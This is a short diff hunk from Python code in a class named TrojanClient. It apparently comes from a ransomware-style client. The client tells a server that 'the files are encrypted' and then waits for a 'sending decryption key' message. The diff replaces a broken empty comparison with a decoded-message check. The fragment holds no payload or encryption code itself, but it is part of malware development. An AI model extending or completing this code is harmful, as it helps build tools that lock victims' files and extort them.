@@ -144,7 +144,8 @@ class TrojanClient:
         protocol.send(self.connection, "the files are encrypted")
         
         msg = protocol.receive(self.connection)
-        if (msg == )
+        msg_decode = msg.decode()
+        if (msg_decode == "sending decryption key"):
 
 
 
